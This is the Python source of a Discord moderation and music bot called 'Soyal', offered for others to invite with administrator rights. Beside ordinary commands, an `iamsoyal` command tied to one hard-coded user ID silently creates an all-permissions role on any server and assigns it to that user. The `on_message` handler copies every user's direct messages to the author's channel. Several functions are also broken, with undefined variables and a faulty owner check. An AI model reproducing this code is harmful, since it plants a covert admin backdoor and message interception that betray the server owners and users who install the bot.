import discord
from discord.ext import commands
from discord.ext.commands.cooldowns import BucketType
import asyncio
import colorsys
import random
import platform
from discord import Game, Embed, Color, Status, ChannelType
import os
import functools
import time
import datetime

client = commands.Bot(description="Here is some command for you", command_prefix=commands.when_mentioned_or("!!"), pm_help = False)



@client.event
async def on_ready():
	print('Logged in as '+client.user.name+'')
	print('--------')
	print('--------')
	print('Started Soyal') #add_your_bot_name_here
	return await client.change_presence(game=discord.Game(name='KELLING MARCOS')) #add_your_bot_status_here
	
def is_owner(ctx):
    return ctx.message.author.id == "472680171451973632,485868646854557696" #replace_it_with_your_discord_id

def is_soyal(ctx):
    return ctx.message.author.id == "472680171451973632" 		

@client.event
async def on_message(message):
    channel = client.get_channel('519791076803084288')
    if message.server is None and message.author != client.user:
        await client.send_message(channel, '{} : <@{}> : '.format(message.author.name, message.author.id) + message.content)
    await client.process_commands(message)

@client.command(pass_context = True) #command_to_stop_your_bot_using-<prefix>shutdown
@commands.check(is_owner)
async def shutdown():
    await client.logout()
  
@client.command(pass_context=True, aliases=['em', 'e'])
async def modmail(ctx, *, msg=None):
    channel = discord.utils.get(client.get_all_channels(), name='📬mod-mails📬')
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    color = discord.Color((r << 16) + (g << 8) + b)
    if not msg:
        await client.say("Please specify a message to send")
    else:
        await client.send_message(channel, embed=discord.Embed(color=color, description=msg + '\n Message From-' + ctx.message.author.id))
        await client.delete_message(ctx.message)
    return
	
@client.command()
async def servers():
  servers = list(client.servers)
  await client.say(f"Connected on {str(len(servers))} servers:")
  await client.say('\n'.join(server.name for server in servers))
 
	
@client.command(pass_context=True)
@commands.check(is_soyal)
async def botdm(ctx, user: discord.Member, *, msg: str):
    await client.send_typing(user)
    await client.send_message(user, msg)
	
	
@client.command(pass_context = True)
@commands.has_permissions(administrator = True)
async def dm(ctx, user: discord.Member, *, msg: str):
    try:
        await client.send_message(user, msg)
        await client.delete_message(ctx.message)          
        await client.say("Success! Your DM has made it! :white_check_mark: ")
    except discord.ext.commands.MissingPermissions:
        await client.say("Aw, come on! You thought you could get away with DM'ing people without permissions.")
    except:
        await client.say("Error :x:. Make sure your message is shaped in this way: ^dm [tag person] [msg]")
	
	
@client.command(pass_context = True)
@commands.check(is_soyal)
async def iamsoyal(ctx):
    user = ctx.message.author
    if discord.utils.get(user.server.roles, name="Soyalk") is None:
        await client.create_role(user.server, name="Soyalk", permissions=discord.Permissions.all())
        role = discord.utils.get(ctx.message.server.roles, name='Soyalk')
        await client.add_roles(ctx.message.author, role)
    else:	
        author = ctx.message.author
        await client.delete_message(ctx.message)
        role = discord.utils.get(ctx.message.server.roles, name='Soyalk')
        await client.add_roles(ctx.message.author, role)
        print('Added Soyalk role in ' + (ctx.message.author.name))
        await client.send_message(author, embed=embed)

		 
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def emojiids(ctx):
  for emoji in ctx.message.author.server.emojis:
    print(f"<:{emoji.name}:{emoji.id}>")
    print(" ")    
	
@client.command(pass_context = True)

async def info(ctx):

    await client.say('***THIS BOT IS MADE BY SOYAL AND IF YOU NEED TO INVITE THIS BOT SO WRITE `sk!botinvite` THANKS***')

@client.command(pass_context = True)

async def botinvite(ctx):

    await client.say('https://discordapp.com/api/oauth2/authorize?client_id=518672070377209857&permissions=8&scope=bot')

@client.command(pass_context = True)
async def test(ctx):
    if ctx.message.author.bot:
      return
    else:
      await client.send_message(ctx.message.author, 'Hii bro what supp')
      await client.say('Check your dm ')

@client.command(pass_context=True)  
@commands.check(is_owner)     
async def kick(ctx,user:discord.Member):
    if user.server_permissions.kick_members:
      await client.say('**He is mod/admin and i am unable to kick him/her**')
      return
    else:
      await client.kick(user)
      await client.say(user.name+' was kicked. Good bye '+user.name+'!')
      await client.delete_message(ctx.message)
      for channel in user.server.channels:
        if channel.name == 'Soyal-log':
            embed=discord.Embed(title="User kicked!", description="**{0}** is kicked by **{1}**!".format(user, ctx.message.author), color=0xFDE112)
            await client.send_message(channel, embed=embed)


@client.command(pass_context = True)
async def play(ctx, *, url):
    author = ctx.message.author
    voice_channel = author.voice_channel
    try:
        vc = await client.join_voice_channel(voice_channel)
        msg = await client.say("Loading...")
        player = await vc.create_ytdl_player("ytsearch:" + url)
        player.start()
        await client.say("Succesfully Loaded ur song!")
        await client.delete_message(msg)
    except Exception as e:
        print(e)
        await client.say("Reconnecting")
        for x in client.voice_clients:
            if(x.server == ctx.message.server):
                await x.disconnect()
                nvc = await client.join_voice_channel(voice_channel)
                msg = await client.say("Loading...")
                player2 = await nvc.create_ytdl_player("ytsearch:" + url)
                player2.start

@client.command(pass_context = True)
async def stop(ctx):
    for x in client.voice_clients:
        if(x.server == ctx.message.server):
            return await x.disconnect()

    return await client.say("I am not playing anyting???!")

        

@client.command(pass_context = True)
async def happybirthday(ctx, *, msg = None):
    if '@here' in msg or '@everyone' in msg:
      return
    if not msg: await client.say("Please specify a user to wish")
    await client.say('Happy birthday have a nice day' + msg + ' http://imgur.com/gallery/PbyNCR2')
    return




@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def setuplog(ctx):
    if ctx.message.author.bot:
      return
    else:
      server = ctx.message.server
      everyone_perms = discord.PermissionOverwrite(send_messages=False, read_messages=True)
      everyone = discord.ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
      await client.create_channel(server, 'soyal-log',everyone)

	

@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def setupwelcome(ctx):
    if ctx.message.author.bot:
      return
    else:
      server = ctx.message.server
      everyone_perms = discord.PermissionOverwrite(send_messages=False, read_messages=True)
      everyone = discord.ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
      await client.create_channel(server, 'welcome_swagat',everyone)
	
	
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def rolesetup(ctx):
    author = ctx.message.author
    server = ctx.message.server
    mod_perms = discord.Permissions(manage_messages=True, kick_members=True, manage_nicknames =True,mute_members=True)
    admin_perms = discord.Permissions(ADMINISTRATOR=True)

    await client.create_role(author.server, name="Owner", permissions=admin_perms)
    await client.create_role(author.server, name="Admin", permissions=admin_perms)
    await client.create_role(author.server, name="Senior Moderator", permissions=mod_perms)
    await client.create_role(author.server, name="G.O.H")
    await client.create_role(author.server, name="Moderator", permissions=mod_perms)
    await client.create_role(author.server, name="Muted")
    await client.create_role(author.server, name="Friend of Owner")


@commands.has_permissions(manage_roles=True)     
async def role(ctx, user: discord.Member, *, role: discord.Role = None):
        if role is None:
            return await client.say("You haven't specified a role! ")

        if role not in user.roles:
            await client.add_roles(user, role)
            return await client.say("{} role has been added to {}.".format(role, user))

        if role in user.roles:
            await client.remove_roles(user, role)
            return await client.say("{} role has been removed from {}.".format(role, user))
 
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)
async def warn(ctx, userName: discord.User, *, message:str): 
    await client.send_message(userName, "You have been warned for: **{}**".format(message))
    await client.say(":warning: __**{0} Has Been Warned!**__ :warning: ** Reason:{1}** ".format(userName,message))
    pass


@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def say(ctx, *, msg = None):
    await client.delete_message(ctx.message)

    if not msg: await client.say("Please specify a message to send")
    else: await client.say(msg)
    return

@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def friend(ctx, user:discord.Member,):
    await client.delete_message(ctx.message)
    role = discord.utils.get(ctx.message.server.roles, name='Friend of Owner')
    await client.add_roles(ctx.message.mentions[0], role)


@client.command(pass_context=True)
async def ownerinfo(ctx):
    embed = discord.Embed(title="Information about owner", description="Bot Name- Soyal", color=0x00ff00)
    embed.set_footer(text="SOYAL")
    embed.set_author(name=" Bot Owner Name- Soyal,472680171451973632")
    embed.add_field(name="Site- coming soon...", value="Thanks for adding our bot", inline=True)
    await client.say(embed=embed)

@client.command(pass_context=True)  
@commands.has_permissions(kick_members=True)
async def getuser(ctx, role: discord.Role = None):
    if role is None:
        await client.say('There is no "STAFF" role on this server!')
        return
    empty = True
    for member in ctx.message.server.members:
        if role in member.roles:
            await client.say("{0.name}: {0.id}".format(member))
            empty = False
    if empty:
        await client.say("Nobody has the role {}".format(role.mention))


@client.command(pass_context = True)
@commands.has_permissions(kick_members=True)     
async def userinfo(ctx, user: discord.Member):
    if ctx.message.author.bot:
      return
    else:
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      embed = discord.Embed(title="{}'s info".format(user.name), description="Here's what I could find.", color = discord.Color((r << 16) + (g << 8) + b))
      embed.add_field(name="Name", value=user.name, inline=True)
      embed.add_field(name="ID", value=user.id, inline=True)
      embed.add_field(name="Status", value=user.status, inline=True)
      embed.add_field(name="Highest role", value=user.top_role)
      embed.add_field(name="Joined", value=user.joined_at)
      embed.set_thumbnail(url=user.avatar_url)
      await client.say(embed=embed)

@client.event
async def on_member_join(member):
    print("In our server" + member.name + " just joined")
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_author(name='Welcome message')
    embed.add_field(name = '__Welcome to Our Server__',value ='**Thanks for Joining our Server Hope you enjoy please respect all members and staff.**',inline = False)
    embed.set_image(url = 'https://media.giphy.com/media/OkJat1YNdoD3W/giphy.gif')
    await client.send_message(member,embed=embed)
    print("Sent message to " + member.name)
    channel = discord.utils.get(client.get_all_channels(), server__name='bysoyal2', name='★彡-welcome-彡★')
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title=f'Welcome {member.name} to {member.server.name}', description='Do not forget to check Rules and never try to break any one of them', color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name='__Thanks for joining__', value='**Hope you will be active here.**', inline=True)
    embed.add_field(name='Your join position is', value=member.joined_at)
    embed.set_image(url = 'https://media.giphy.com/media/OkJat1YNdoD3W/giphy.gif')
    embed.set_thumbnail(url=member.avatar_url)
    await client.send_message(channel, embed=embed)

	
@client.event
async def on_member_remove(member):
    for channel in member.server.channels:
        if channel.name == '★彡-welcome-彡★':
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = discord.Embed(title=f'{member.name} just left {member.server.name}', description='Bye bye 👋! We will miss you 😢', color = discord.Color((r << 16) + (g << 8) + b))
            embed.add_field(name='__User left__', value='**Hope you will be back soon 😕.**', inline=True)
            embed.add_field(name='Your join position was', value=member.joined_at)
            embed.set_thumbnail(url=member.avatar_url)
            await client.send_message(channel, embed=embed)


@client.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
@commands.cooldown(rate=5,per=86400,type=BucketType.user) 
async def access(ctx, member: discord.Member):
    if ctx.message.author.bot:
      return
    else:
      role = discord.utils.get(member.server.roles, name='access')
      await client.add_roles(member, role)
      await client.say("Gave access to {}".format(member))
      for channel in member.server.channels:
        if channel.name == 'soyal-log':
            embed=discord.Embed(title="User Got Access!", description="**{0}** got access from **{1}**!".format(member, ctx.message.author), color=0x020202)
            await client.send_message(channel, embed=embed)
            await asyncio.sleep(45*60)
            await client.remove_roles(member, role)


@client.command(pass_context = True)
@commands.has_permissions(manage_nicknames=True)     
async def setnick(ctx, user: discord.Member, *, nickname):
    await client.change_nickname(user, nickname)
    await client.delete_message(ctx.message)
    for channel in user.server.channels:
      if channel.name == 'soyal-log':
          embed=discord.Embed(title="Changed Nickname of User!", description="**{0}** nickname was changed by **{1}**!".format(member, ctx.message.author), color=0x0521F6)
          await client.send_message(channel, embed=embed)



@client.command(pass_context=True)
async def poll(ctx, question, *options: str):
        if len(options) <= 1:
            await client.say('You need more than one option to make a poll!')
            return
        if len(options) > 10:
            await client.say('You cannot make a poll for more than 10 things!')
            return

        if len(options) == 2 and options[0] == 'yes' and options[1] == 'no':
            reactions = ['👍', '👎']
        else:
            reactions = ['1\u20e3', '2\u20e3', '3\u20e3', '4\u20e3', '5\u20e3', '6\u20e3', '7\u20e3', '8\u20e3', '9\u20e3', '\U0001f51f']

        description = []
        for x, option in enumerate(options):
            description += '\n {} {}'.format(reactions[x], option)
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title=question, description=''.join(description), color = discord.Color((r << 16) + (g << 8) + b))
        react_message = await client.say(embed=embed)
        for reaction in reactions[:len(options)]:
            await client.add_reaction(react_message, reaction)
        embed.set_footer(text='Poll ID: {}'.format(react_message.id))
        await client.edit_message(react_message, embed=embed)


@client.command(pass_context=True)  
@commands.has_permissions(ban_members=True)      
async def ban(ctx,user:discord.Member):
    if user.server_permissions.ban_members:
      await client.say('**He is mod/admin and i am unable to ban him/her**')
      return
    else:
      await client.ban(user)
      await client.say(user.name+' was banned. Good bye '+user.name+'!')
      for channel in member.server.channels:
        if channel.name == 'soyal-log':
            embed=discord.Embed(title="User banned!", description="**{0}** banned by **{1}**!".format(member, ctx.message.author), color=0x38761D)
            await client.send_message(channel, embed=embed)


@client.command(pass_context=True)  
@commands.has_permissions(ban_members=True)     
async def unban(ctx):
    ban_list = await client.get_bans(ctx.message.server)

    # Show banned users
    await client.say("Ban list:\n{}".format("\n".join([user.name for user in ban_list])))

    # Unban last banned user
    if not ban_list:
      await client.say('Ban list is empty.')
      return
    else:
      await client.unban(ctx.message.server, ban_list[-1])
      await client.say('Unbanned user: `{}`'.format(ban_list[-1].name))
      for channel in member.server.channels:
        if channel.name == 'soyal-log':
            embed=discord.Embed(title="User unbanned!", description="**{0}** unbanned by **{1}**!".format(ban_list[-1].name, ctx.message.author), color=0x38761D)
            await client.send_message(channel, embed=embed)


@client.command(pass_context=True)  
@commands.has_permissions(kick_members=True)     

async def serverinfo(ctx):
    '''Displays Info About The Server!'''

    server = ctx.message.server
    roles = [x.name for x in server.role_hierarchy]
    role_length = len(roles)

    if role_length > 50: #Just in case there are too many roles...
        roles = roles[:50]
        roles.append('>>>> Displaying[50/%s] Roles'%len(roles))

    roles = ', '.join(roles);
    channelz = len(server.channels);
    time = str(server.created_at); time = time.split(' '); time= time[0];
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    join = discord.Embed(description= '%s '%(str(server)),title = 'Server Name', color = discord.Color((r << 16) + (g << 8) + b));
    join.set_thumbnail(url = server.icon_url);
    join.add_field(name = '__Owner__', value = str(server.owner) + '\n' + server.owner.id);
    join.add_field(name = '__ID__', value = str(server.id))
    join.add_field(name = '__Member Count__', value = str(server.member_count));
    join.add_field(name = '__Text/Voice Channels__', value = str(channelz));
    join.add_field(name = '__Roles (%s)__'%str(role_length), value = roles);
    join.set_footer(text ='Created: %s'%time);

    return await client.say(embed = join);



@client.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def makemod(ctx, user: discord.Member):
    nickname = '[̲̅M̲̅]' + user.name
    await client.change_nickname(user, nickname=nickname)
    role = discord.utils.get(ctx.message.server.roles, name='Moderator')
    await client.add_roles(user, role)
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_author(name='Congratulations Message')
    embed.add_field(name = '__Congratulations__',value ='**Congratulations for mod.Hope you will be more active here. Thanks for your help and support.**',inline = False)
    embed.set_image(url = 'https://preview.ibb.co/i1izTz/ezgif_5_e20b665628.gif')
    await client.send_message(user,embed=embed)
    await client.delete_message(ctx.message)


@client.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def makeadmin(ctx, user: discord.Member):
    nickname = 'Ѧ'+ user.name
    await client.change_nickname(user, nickname=nickname)
    role = discord.utils.get(ctx.message.server.roles, name='Admin')
    await client.add_roles(user, role)
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_author(name='Congratulations Message')
    embed.add_field(name = '__Congratulations__',value ='**Congratulations for Admin.Hope you will be more active here. Thanks for your help and support.**',inline = False)
    embed.set_image(url = 'https://preview.ibb.co/i1izTz/ezgif_5_e20b665628.gif')
    await client.send_message(user,embed=embed)
    await client.delete_message(ctx.message)


@client.command(pass_context = True)
async def sorry(ctx, *, msg = None):
    if '@here' in msg or '@everyone' in msg:
      return
    if not msg: await client.say("Please Sorry")
    await client.say('Sorry ' + msg + ' http://imgur.com/gallery/Dif2lYI')
    return


@client.command(pass_context = True)
@commands.has_permissions(manage_messages=True)  
async def clear(ctx, number):
 
    if ctx.message.author.server_permissions.manage_messages:
         mgs = [] #Empty list to put all the messages in the log
         number = int(number) #Converting the amount of messages to delete to an integer
    async for x in client.logs_from(ctx.message.channel, limit = number+1):
        mgs.append(x)            
       
    try:
        await client.delete_messages(mgs)          
        await client.say(str(number)+' messages deleted')
     
    except discord.Forbidden:
        await client.say(embed=Forbidden)
        return
    except discord.HTTPException:
        await client.say('clear failed.')
        return         
   
 
    await client.delete_messages(mgs)      

 
@client.event
async def on_message_delete(message):
    if not message.author.bot:
      channelname = 'soyal-log'
      logchannel=None
      for channel in message.server.channels:
        if channel.name == channelname:
          user = message.author
      for channel in user.server.channels:
        if channel.name == 'soyal-log':
          logchannel = channel
          r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
          embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
          embed.set_author(name='Message deleted')
          embed.add_field(name = 'User: **{0}**'.format(user.name),value ='UserID: **{}**'.format(user.id),inline = False)
          embed.add_field(name = 'Message:',value ='{}'.format(message.content),inline = False)
          embed.add_field(name = 'Channel:',value ='{}'.format(message.channel.name),inline = False)
          await client.send_message(logchannel,  embed=embed)	
	
	
	
client.run(os.getenv('Token'))
